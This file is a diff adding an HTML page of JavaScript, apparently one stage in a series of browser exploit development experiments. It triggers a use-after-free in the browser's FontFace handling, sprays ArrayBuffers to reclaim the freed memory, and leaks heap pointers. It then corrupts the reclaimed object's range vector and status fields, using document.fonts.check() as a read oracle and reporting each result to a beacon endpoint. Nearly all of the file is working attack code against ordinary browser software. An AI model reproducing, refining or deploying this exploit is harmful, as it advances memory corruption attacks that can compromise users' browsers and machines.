@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P744 — Status Byte Discovery & Live Oracle Synthesis</title>
+<script>
+'use strict';
+/* ============================================================
+ * P744 — Status Byte Discovery & Live Oracle Synthesis
+ *
+ * Ground Truth from P743:
+ * - Pristine P731 Reclaim achieved 100% stability, baseK=68, 0 crashes.
+ * - Active Boolean Oracle on actFace (url(/hang.php)) verified:
+ *     status='loading' | inA=false | outD=true | outZ=true
+ * - CSSFontFaceSet::check() logic:
+ *     Returns false ONLY IF face.status() == Pending(0) || Loading(1).
+ *     Reclaimed trFam currently has status == Loaded(3).
+ *
+ * Objectives of P744:
+ * 1. Step 1: Baseline Heap Leak (P58, P68).
+ * 2. Step 2: Pristine Reclaim (Slot 68).
+ * 3. Phase A: Active Oracle Health & Lifetime Monitor:
+ *    - Track ACT_FACE.status across all time intervals (0ms, 100ms, 300ms, 500ms).
+ *    - Verify dynamic mutation U+44-48 with live status check.
+ * 4. Phase B: Systematic C++ m_status Byte Scan on Reclaimed VIEW_B:
+ *    - Configure VIEW_B[0] = 0x0000004300000041n (range 'A'..'C').
+ *    - Point VIEW_B[4] = P58, VIEW_B[5] = 0x100000001.
+ *    - Scan bytes 96 to 191 in VIEW_B: test writing 1 (Loading) or 0 (Pending).
+ *    - Query document.fonts.check('1em trFam', 'A') at each candidate.
+ *    - When check() flips from true to false: HIT! The exact m_status byte is discovered!
+ * 5. Phase C: Point Range Vector to P68 (Heap Pointer Arbitrary Read Proof).
+ * ============================================================ */
+
+function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }
+
+function b(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P744-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+
+var OUT=null;
+function log(s){
+  if(!OUT) OUT=document.getElementById('out');
+  if(OUT) OUT.textContent += s + '\n';
+}
+
+var P58=null, P68=null;
+var FACE_B=null, BUF_B=null, VIEW_B=null;
+var U8_B=null;
+var ACT_FACE=null;
+
+function run(){
+  OUT=document.getElementById('out');
+  if(OUT) OUT.textContent='=== P744 Status Byte Discovery & Oracle Synthesis ===\n\n';
+  b('BOOT','p744-status-oracle');
+
+  log('[Step 1] Baseline heap leak...');
+  doLeak(function(){
+    log('P58=0x'+h16(P58)+' P68=0x'+h16(P68)+'\n');
+
+    log('[Step 2] Executing pristine reclaim...');
+    doReclaim(function(){
+      log('\n[Phase A] Active Oracle Health & Lifetime Monitor...');
+      phaseA(function(){
+        log('\n[Phase B] Systematic m_status Byte Scan in VIEW_B...');
+        phaseB(function(){
+          log('\n[Phase C] Heap Pointer Range Target Test...');
+          phaseC(function(){
+            b('DONE','p744-complete');
+            log('\n=== P744 Complete! ===');
+          });
+        });
+      });
+    });
+  });
+}
+
+/* ---- Step 1: Leak ---- */
+function doLeak(cb){
+  b('LEAK-GO','');
+  var st=document.createElement('style');
+  st.textContent='@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+  var face=new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
+  document.fonts.add(face); void face.loaded;
+
+  var abs=[],fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired) return undefined; fired=true;
+      if(st){st.remove();st.textContent='';st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk0');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}});
+
+  document.fonts.load('1em fl0, lk0','AB');
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1,bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]),nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz;best=i;}
+    }
+    if(best<0||bestNz<4){b('LEAK-MISS','nz='+bestNz); doLeakRetry(cb); return;}
+    var v=new BigUint64Array(abs[best]);
+    extractPtrs(v);
+    if(!P58){b('LEAK-NOPTR','nz='+bestNz); doLeakRetry(cb); return;}
+    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
+    setTimeout(cb,100);
+  },350);
+}
+
+function doLeakRetry(cb){
+  b('LEAK-RETRY','');
+  var st2=document.createElement('style');
+  st2.textContent='@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
+  document.head.appendChild(st2);
+  var face2=new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
+  document.fonts.add(face2); void face2.loaded;
+  var abs2=[],fired2=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired2) return undefined; fired2=true;
+      if(st2){st2.remove();st2.textContent='';st2=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk1');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}});
+  document.fonts.load('1em fl1, lk1','CD');
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1,bestNz=0;
+    for(var i=0;i<abs2.length;i++){
+      var u=new Uint8Array(abs2[i]),nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz;best=i;}
+    }
+    if(best<0||bestNz<4){b('LEAK-RETRY-MISS','nz='+bestNz);return;}
+    var v=new BigUint64Array(abs2[best]);
+    extractPtrs(v);
+    if(!P58){b('LEAK-RETRY-NOPTR','');return;}
+    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
+    setTimeout(cb,100);
+  },400);
+}
+
+function extractPtrs(v){
+  var LO=BigInt('0x1000000000'),HI=BigInt('0x80000000000');
+  if(v[11] >= LO && v[11] < HI) P58 = v[11];
+  if(v[13] >= LO && v[13] < HI) P68 = v[13];
+  if(!P58 || !P68){
+    for(var q=0;q<24;q++){
+      var val=v[q];
+      if(val>=LO&&val<HI){
+        if(!P58) P58=val;
+        else if(!P68&&val!==P58) P68=val;
+      }
+    }
+  }
+  if(!P68) P68=0n;
+}
+
+/* ---- Step 2: Pristine Reclaim ---- */
+function doReclaim(cb){
+  b('REC-START','fill_q12_q6=0x'+h16(P58));
+
+  var stTr=document.createElement('style');
+  stTr.textContent='@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
+  document.head.appendChild(stTr);
+
+  FACE_B=new FontFace('trFace','local(Helvetica)',{unicodeRange:'U+0048'});
+  document.fonts.add(FACE_B);
+  void FACE_B.loaded;
+
+  var absW=[],firedW=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(firedW) return undefined; firedW=true;
+      if(stTr){stTr.remove();stTr.textContent='';stTr=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+
+      for(var k=0;k<80;k++){
+        var ab=new ArrayBuffer(192);
+        var view=new BigUint64Array(ab);
+        view[12]=P58;
+        view[6]=P58;
+        absW.push(ab);
+      }
+
+      try{document.fonts.check('1em trFam');}catch(e){}
+      return undefined;
+    },set:function(){}});
+
+  document.fonts.load('1em trFace, trFam','GH');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1,bestNz=0;
+    for(var i=0;i<absW.length;i++){
+      var u=new Uint8Array(absW[i]),nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz;best=i;}
+    }
+    if(best<0||bestNz<4){b('RECLAIM-MISS','nz='+bestNz);log('Reclaim missed!');return;}
+
+    BUF_B=absW[best];
+    VIEW_B=new BigUint64Array(BUF_B);
+    U8_B=new Uint8Array(BUF_B);
+
+    var dump0_11=[], dump12_23=[];
+    for(var q=0;q<12;q++) dump0_11.push('q'+q+'=0x'+h16(VIEW_B[q]));
+    for(var q=12;q<24;q++) dump12_23.push('q'+q+'=0x'+h16(VIEW_B[q]));
+
+    b('RECLAIM-OK','baseK='+best);
+    b('DUMP-Q0-Q11', dump0_11.join(';'));
+    b('DUMP-Q12-Q23', dump12_23.join(';'));
+    log('Pristine Reclaim OK at slot '+best);
+
+    setTimeout(cb,150);
+  },400);
+}
+
+/* ---- Phase A: Active Oracle Health & Dynamic Verification ---- */
+function phaseA(cb){
+  try {
+    ACT_FACE = new FontFace('actPendFam', 'url(/hang.php)', {unicodeRange: 'U+41-43'});
+    document.fonts.add(ACT_FACE);
+    ACT_FACE.load().catch(function(){});
+
+    var st0 = ACT_FACE.status;
+    var a0 = document.fonts.check('1em actPendFam', 'A');
+    var d0 = document.fonts.check('1em actPendFam', 'D');
+
+    /* Immediate mutation test with zero delay */
+    ACT_FACE.unicodeRange = 'U+44-48';
+    var st1 = ACT_FACE.status;
+    var a1 = document.fonts.check('1em actPendFam', 'A');
+    var d1 = document.fonts.check('1em actPendFam', 'D');
+    var h1 = document.fonts.check('1em actPendFam', 'H');
+    var z1 = document.fonts.check('1em actPendFam', 'Z');
+
+    var rep = 'st0='+st0+'|a0='+a0+'|d0='+d0+'|st1='+st1+'|a1='+a1+'|d1='+d1+'|h1='+h1+'|z1='+z1;
+    b('A-ORACLE-HEALTH', rep);
+    log('Phase A Oracle Health: ' + rep);
+  } catch(e){
+    b('A-ORACLE-ERR', e.message);
+  }
+  setTimeout(cb, 100);
+}
+
+/* ---- Phase B: Systematic m_status Byte Scan in VIEW_B ---- */
+function phaseB(cb){
+  if(!VIEW_B || !U8_B){ b('B-SKIP','no-view'); cb(); return; }
+
+  /* Seed P58 + 0x00: UnicodeRange for 'A'..'C' (0x41..0x43) */
+  VIEW_B[0] = 0x0000004300000041n;
+  /* Configure m_ranges */
+  VIEW_B[4] = P58;
+  VIEW_B[5] = 0x0000000100000001n; /* size=1, cap=1 */
+
+  var baseA = document.fonts.check('1em trFam', 'A');
+  var baseD = document.fonts.check('1em trFam', 'D');
+  b('B-SCAN-BASE', 'baseA='+baseA+'|baseD='+baseD);
+  log('Phase B Baseline: A=' + baseA + ', D=' + baseD);
+
+  /* Scan candidate status offsets in U8_B from byte 96 to 191 */
+  var hits = [];
+  for(var byteIdx = 96; byteIdx < 192; byteIdx++){
+    /* Skip critical pointer bytes:
+     * q11 (88..95)
+     * q12 (96..103)
+     * q13 (104..111)
+     */
+    if(byteIdx >= 88 && byteIdx <= 111) continue;
+
+    var orig = U8_B[byteIdx];
+
+    /* Test 1: Status::Loading (1) */
+    U8_B[byteIdx] = 1;
+    var chkLoadA = document.fonts.check('1em trFam', 'A');
+    if(chkLoadA === false){
+      hits.push('byte' + byteIdx + '=Loading(1)');
+      b('B-STATUS-HIT', 'offset=+0x' + byteIdx.toString(16) + '|val=1|chkA=' + chkLoadA);
+      log('*** STATUS HIT at byte +0x' + byteIdx.toString(16) + ' (val=1) -> chkA=false!');
+    }
+
+    /* Test 2: Status::Pending (0) */
+    U8_B[byteIdx] = 0;
+    var chkPendA = document.fonts.check('1em trFam', 'A');
+    if(chkPendA === false){
+      hits.push('byte' + byteIdx + '=Pending(0)');
+      b('B-STATUS-HIT', 'offset=+0x' + byteIdx.toString(16) + '|val=0|chkA=' + chkPendA);
+      log('*** STATUS HIT at byte +0x' + byteIdx.toString(16) + ' (val=0) -> chkA=false!');
+    }
+
+    /* Restore */
+    U8_B[byteIdx] = orig;
+  }
+
+  if(hits.length === 0){
+    b('B-NO-HITS', 'scanned-96-191');
+    log('No direct byte in 96..191 flipped status to false.');
+  } else {
+    b('B-HITS-SUMMARY', hits.join(';'));
+  }
+
+  setTimeout(cb, 100);
+}
+
+/* ---- Phase C: Heap Pointer Target & Range Query ---- */
+function phaseC(cb){
+  if(!VIEW_B){ b('C-SKIP','no-view'); cb(); return; }
+
+  /* Test pointing m_ranges.m_buffer (q4) directly to P68 */
+  VIEW_B[4] = P68;
+  VIEW_B[5] = 0x0000000100000001n; /* size=1, cap=1 */
+
+  var qP68_A = document.fonts.check('1em trFam', 'A');
+  var qP68_G = document.fonts.check('1em trFam', 'G');
+  var qP68_Z = document.fonts.check('1em trFam', 'Z');
+
+  b('C-P68-TARGET', 'q4=P68|A=' + qP68_A + '|G=' + qP68_G + '|Z=' + qP68_Z);
+  log('Phase C P68 Target: A=' + qP68_A + ', G=' + qP68_G + ', Z=' + qP68_Z);
+
+  /* Restore m_ranges to P58 */
+  VIEW_B[4] = P58;
+
+  setTimeout(cb, 100);
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P744 — Initializing...</pre></body></html>
